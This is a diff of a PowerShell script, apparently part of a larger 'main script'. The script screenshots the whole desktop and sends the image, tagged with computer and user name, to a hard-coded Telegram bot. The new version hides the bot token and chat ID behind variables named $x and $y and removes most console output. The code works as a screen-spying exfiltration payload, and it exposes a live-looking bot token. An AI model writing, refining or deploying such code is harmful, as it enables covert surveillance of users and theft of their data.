@@ -1,329 +1,85 @@
-# ===========================================
-# SCREENSHOT TO TELEGRAM TEST SCRIPT
-# ===========================================
+# SIMPLE SCREENSHOT TO TELEGRAM
+# Works with the same bot token and chat ID from your main script
 
-# CONFIGURATION - CHANGE THESE!
-$BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
-$ChatID = "2146236602"
+# Configuration (same as your main script)
+$x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"  # Bot token
+$y = "2146236602"  # Chat ID
 
-# Function to capture screenshot and send to Telegram
-function Test-Screenshot {
-    param(
-        [string]$Caption = "📸 Screenshot from $env:COMPUTERNAME"
-    )
-    
-    Write-Host "`n" + "="*50 -ForegroundColor Cyan
-    Write-Host "   SCREENSHOT CAPTURE TEST   " -ForegroundColor Cyan
-    Write-Host "="*50 -ForegroundColor Cyan
-    
-    Write-Host "📸 Capturing screenshot..." -ForegroundColor Yellow
+# Function to capture and send screenshot
+function Capture-Screenshot {
+    Write-Host "📸 Taking screenshot..." -ForegroundColor Yellow
     
     try {
-        # Create temp folder
-        $tempFolder = "$env:TEMP\TelegramSS"
-        if (-not (Test-Path $tempFolder)) {
-            New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null
-            Write-Host "✓ Created temp folder" -ForegroundColor Green
-        }
-        
-        # Generate filename with timestamp
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        $screenshotPath = "$tempFolder\ss_$timestamp.png"
-        
-        Write-Host "✓ Generating filename: $screenshotPath" -ForegroundColor Green
-        
-        # Take screenshot
-        Write-Host "✓ Loading required assemblies..." -ForegroundColor Green
+        # Load required assemblies
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
         
-        Write-Host "✓ Getting screen information..." -ForegroundColor Green
+        # Capture screen
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        Write-Host "  Screen resolution: $($screen.Width) x $($screen.Height)" -ForegroundColor Gray
-        
-        Write-Host "✓ Creating bitmap..." -ForegroundColor Green
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        
-        Write-Host "✓ Capturing screen..." -ForegroundColor Green
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
         
-        # Save screenshot
-        Write-Host "✓ Saving screenshot..." -ForegroundColor Green
+        # Save to temp file
+        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
         $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
         $graphics.Dispose()
         $bitmap.Dispose()
         
-        # Verify file was saved
-        if (Test-Path $screenshotPath) {
-            $fileSize = (Get-Item $screenshotPath).Length / 1KB
-            Write-Host "✅ Screenshot saved successfully!" -ForegroundColor Green
-            Write-Host "   Path: $screenshotPath" -ForegroundColor Gray
-            Write-Host "   Size: $($fileSize.ToString('0.00')) KB" -ForegroundColor Gray
-        } else {
-            Write-Host "❌ Failed to save screenshot" -ForegroundColor Red
-            return $false
-        }
+        Write-Host "✅ Screenshot saved: $screenshotPath" -ForegroundColor Green
         
-        # Send to Telegram
-        Write-Host "`n📤 Sending to Telegram..." -ForegroundColor Yellow
+        # Send to Telegram (using same method as your main script)
+        Write-Host "📤 Sending to Telegram..." -ForegroundColor Yellow
         
-        # Create enhanced caption
-        $enhancedCaption = @"
-$Caption
-
-🖥️ Computer: $env:COMPUTERNAME
-👤 User: $env:USERNAME
-📍 Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-📊 Size: $($fileSize.ToString('0.00')) KB
-🖼️ Resolution: $($screen.Width) x $($screen.Height)
-"@
+        # Create caption
+        $caption = "🖥️ Screenshot from $env:COMPUTERNAME`n👤 User: $env:USERNAME`n📍 Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
-        Write-Host "✓ Using Bot Token: $($BotToken.Substring(0, 10))..." -ForegroundColor Green
-        Write-Host "✓ Chat ID: $ChatID" -ForegroundColor Green
+        # Read file bytes
+        $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
+        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
         
-        # Method 1: Using curl (simpler)
-        Write-Host "✓ Trying Method 1 (curl)..." -ForegroundColor Green
+        # Build multipart form data
+        $bodyLines = @(
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            "$y",
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "",
+            "$caption",
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"photo`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
+            "Content-Type: image/png",
+            "",
+            $fileEnc,
+            "--$boundary--"
+        ) -join $LF
         
-        try {
-            $telegramUrl = "https://api.telegram.org/bot$BotToken/sendPhoto"
-            Write-Host "  URL: $telegramUrl" -ForegroundColor Gray
-            
-            # Build curl command
-            $curlArgs = @(
-                "-s",
-                "-X", "POST",
-                "-F", "chat_id=$ChatID",
-                "-F", "caption=$enhancedCaption",
-                "-F", "photo=@$screenshotPath",
-                $telegramUrl
-            )
-            
-            # Execute curl
-            $result = curl @curlArgs 2>$null
-            
-            if ($result) {
-                try {
-                    $jsonResult = $result | ConvertFrom-Json
-                    if ($jsonResult.ok -eq $true) {
-                        Write-Host "✅ Screenshot sent successfully via curl!" -ForegroundColor Green
-                        Write-Host "   Message ID: $($jsonResult.result.message_id)" -ForegroundColor Cyan
-                        
-                        # Delete local file
-                        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
-                        Write-Host "✓ Local file cleaned up" -ForegroundColor Gray
-                        return $true
-                    } else {
-                        Write-Host "❌ Telegram API error: $($jsonResult.description)" -ForegroundColor Red
-                    }
-                } catch {
-                    Write-Host "❌ Failed to parse response: $result" -ForegroundColor Red
-                }
-            } else {
-                Write-Host "❌ No response from curl" -ForegroundColor Red
-            }
-        }
-        catch {
-            Write-Host "❌ Method 1 failed: $($_.Exception.Message)" -ForegroundColor Red
-        }
+        $uri = "https://api.telegram.org/bot$x/sendPhoto"
         
-        # Method 2: Using Invoke-RestMethod (fallback)
-        Write-Host "`n✓ Trying Method 2 (Invoke-RestMethod)..." -ForegroundColor Yellow
-        
-        try {
-            # Read file
-            $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
-            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-            $boundary = [System.Guid]::NewGuid().ToString()
-            $LF = "`r`n"
-            
-            # Build multipart form data
-            $bodyLines = @(
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"chat_id`"",
-                "",
-                "$ChatID",
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"caption`"",
-                "",
-                "$enhancedCaption",
-                "--$boundary",
-                "Content-Disposition: form-data; name=`"photo`"; filename=`"$(Split-Path $screenshotPath -Leaf)`"",
-                "Content-Type: image/png",
-                "",
-                $fileEnc,
-                "--$boundary--"
-            ) -join $LF
-            
-            $uri = "https://api.telegram.org/bot$BotToken/sendPhoto"
-            
-            Write-Host "  Sending request..." -ForegroundColor Gray
-            $response = Invoke-RestMethod -Uri $uri -Method Post `
-                -ContentType "multipart/form-data; boundary=$boundary" `
-                -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
-            
-            if ($response.ok -eq $true) {
-                Write-Host "✅ Screenshot sent via Invoke-RestMethod!" -ForegroundColor Green
-                Write-Host "   Message ID: $($response.result.message_id)" -ForegroundColor Cyan
-                
-                # Delete local file
-                Remove-Item $screenshotPath -Force
-                return $true
-            } else {
-                Write-Host "❌ Telegram API error" -ForegroundColor Red
-            }
-        }
-        catch {
-            Write-Host "❌ Method 2 failed: $($_.Exception.Message)" -ForegroundColor Red
-        }
-        
-        # Method 3: Using Invoke-WebRequest (another fallback)
-        Write-Host "`n✓ Trying Method 3 (Invoke-WebRequest)..." -ForegroundColor Yellow
-        
-        try {
-            $uri = "https://api.telegram.org/bot$BotToken/sendPhoto"
-            
-            $form = @{
-                chat_id = $ChatID
-                caption = $enhancedCaption
-                photo = Get-Item $screenshotPath
-            }
-            
-            $response = Invoke-WebRequest -Uri $uri -Method Post -Form $form
-            $result = $response.Content | ConvertFrom-Json
-            
-            if ($result.ok -eq $true) {
-                Write-Host "✅ Screenshot sent via Invoke-WebRequest!" -ForegroundColor Green
-                Remove-Item $screenshotPath -Force
-                return $true
-            }
-        }
-        catch {
-            Write-Host "❌ Method 3 failed: $($_.Exception.Message)" -ForegroundColor Red
-        }
-        
-        # If all methods fail
-        Write-Host "`n❌ All sending methods failed!" -ForegroundColor Red
-        Write-Host "   Screenshot saved at: $screenshotPath" -ForegroundColor Yellow
-        return $false
-        
-    }
-    catch {
-        Write-Host "❌ Error in screenshot function: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "   Error details: $($_.Exception.StackTrace)" -ForegroundColor Gray
-        return $false
-    }
-}
-
-# Function to test Telegram bot connection
-function Test-TelegramConnection {
-    Write-Host "`n🔗 Testing Telegram bot connection..." -ForegroundColor Yellow
-    
-    try {
-        $url = "https://api.telegram.org/bot$BotToken/getMe"
-        Write-Host "  Calling: $url" -ForegroundColor Gray
-        
-        $response = Invoke-RestMethod -Uri $url
+        # Send request
+        $response = Invoke-RestMethod -Uri $uri -Method Post `
+            -ContentType "multipart/form-data; boundary=$boundary" `
+            -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
         
         if ($response.ok) {
-            Write-Host "✅ Bot connection successful!" -ForegroundColor Green
-            Write-Host "   Bot: @$($response.result.username)" -ForegroundColor Cyan
-            Write-Host "   Name: $($response.result.first_name)" -ForegroundColor Cyan
-            Write-Host "   ID: $($response.result.id)" -ForegroundColor Cyan
-            return $true
+            Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
+            # Cleanup
+            Remove-Item $screenshotPath -Force
         } else {
-            Write-Host "❌ Bot connection failed!" -ForegroundColor Red
-            return $false
+            Write-Host "❌ Telegram API error" -ForegroundColor Red
         }
-    }
-    catch {
-        Write-Host "❌ Connection failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+        
+    } catch {
+        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
-# Function to test sending simple message
-function Test-TelegramMessage {
-    Write-Host "`n📨 Testing Telegram message sending..." -ForegroundColor Yellow
-    
-    try {
-        $url = "https://api.telegram.org/bot$BotToken/sendMessage"
-        $body = @{
-            chat_id = $ChatID
-            text = "🔧 Test message from $env:COMPUTERNAME`n⏰ Time: $(Get-Date -Format 'HH:mm:ss')"
-        } | ConvertTo-Json
-        
-        Write-Host "  Sending test message..." -ForegroundColor Gray
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
-        
-        if ($response.ok) {
-            Write-Host "✅ Test message sent successfully!" -ForegroundColor Green
-            Write-Host "   Message ID: $($response.result.message_id)" -ForegroundColor Cyan
-            return $true
-        } else {
-            Write-Host "❌ Failed to send message" -ForegroundColor Red
-            return $false
-        }
-    }
-    catch {
-        Write-Host "❌ Message test failed: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
-}
-
-# Main execution
+# Execute
 Clear-Host
-Write-Host "==========================================" -ForegroundColor Cyan
-Write-Host "   TELEGRAM SCREENSHOT TEST SCRIPT   " -ForegroundColor Cyan
-Write-Host "==========================================" -ForegroundColor Cyan
-
-Write-Host "`n📋 Configuration:" -ForegroundColor Yellow
-Write-Host "  Computer: $env:COMPUTERNAME" -ForegroundColor Gray
-Write-Host "  User: $env:USERNAME" -ForegroundColor Gray
-Write-Host "  Bot Token: $($BotToken.Substring(0, 10))..." -ForegroundColor Gray
-Write-Host "  Chat ID: $ChatID" -ForegroundColor Gray
-Write-Host "  Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
-
-# Test 1: Telegram connection
-Write-Host "`n[TEST 1/3] Telegram Bot Connection" -ForegroundColor Magenta
-$connectionTest = Test-TelegramConnection
-
-if (-not $connectionTest) {
-    Write-Host "❌ Bot connection failed. Check your token." -ForegroundColor Red
-    Write-Host "   Token format should be: 1234567890:ABCdefGHIJklmNOPqrsTUVwxyZ" -ForegroundColor Yellow
-    Write-Host "   Make sure you've started a conversation with the bot" -ForegroundColor Yellow
-    exit
-}
-
-# Test 2: Send test message
-Write-Host "`n[TEST 2/3] Test Message" -ForegroundColor Magenta
-$messageTest = Test-TelegramMessage
-
-if (-not $messageTest) {
-    Write-Host "⚠️  Message test failed, but continuing with screenshot test..." -ForegroundColor Yellow
-}
-
-# Test 3: Screenshot
-Write-Host "`n[TEST 3/3] Screenshot Capture & Send" -ForegroundColor Magenta
-$screenshotTest = Test-Screenshot -Caption "📸 Test screenshot from $env:COMPUTERNAME"
-
-# Summary
-Write-Host "`n" + "="*50 -ForegroundColor Cyan
-Write-Host "   TEST RESULTS SUMMARY   " -ForegroundColor Cyan
-Write-Host "="*50 -ForegroundColor Cyan
-
-if ($screenshotTest) {
-    Write-Host "🎉 ALL TESTS PASSED!" -ForegroundColor Green
-    Write-Host "✅ Screenshot successfully captured and sent to Telegram" -ForegroundColor Green
-} else {
-    Write-Host "⚠️  Some tests failed" -ForegroundColor Yellow
-    Write-Host "   Check the error messages above" -ForegroundColor Gray
-}
-
-Write-Host "`n📝 Notes:" -ForegroundColor Yellow
-Write-Host "• The screenshot is saved to %TEMP%\TelegramSS\" -ForegroundColor Gray
-Write-Host "• File is automatically deleted after successful send" -ForegroundColor Gray
-Write-Host "• If screenshot fails, check bot permissions and file size" -ForegroundColor Gray
-
-Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+Write-Host "Screenshot to Telegram Test" -ForegroundColor Cyan
+Write-Host "===========================" -ForegroundColor Cyan
+Capture-Screenshot
